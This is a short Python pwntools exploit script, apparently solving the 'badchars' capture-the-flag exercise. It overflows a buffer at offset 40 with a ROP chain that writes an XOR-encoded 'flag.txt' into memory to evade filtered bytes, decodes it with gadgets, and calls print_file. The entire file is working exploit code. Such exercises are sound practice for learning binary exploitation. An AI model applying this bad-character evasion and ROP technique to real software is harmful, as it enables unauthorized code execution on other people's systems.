#!/usr/bin/env python3

from pwn import *

elf = ELF("badchars")
context.update(binary=elf, encoding='latin-1')

def start():
    if args.GDB:
        return gdb.debug(elf.path)
    elif args.REMOTE:
        return remote("localhost", 1337)
    else:
        return process([elf.path])


def main():
    io = start()
    rop = ROP(elf, badchars=b"\x78\x67\x61\x2E")
    # mov    QWORD PTR [r13+0x0],r12
    rop(r13=elf.sym.data_start+7, r12=xor(b"flag.txt",2))
    rop.call(elf.sym.usefulGadgets+12)
    # xor    BYTE PTR [r15],r14b
    for i in range(8):
        rop(r14=2, r15=elf.sym.data_start+7+i)
        rop.call(elf.sym.usefulGadgets)

    rop.print_file(elf.sym.data_start+7)

    io.clean()
    io.fit({
        40: rop.chain()
        })

    io.interactive()


if __name__ == "__main__":
    main()
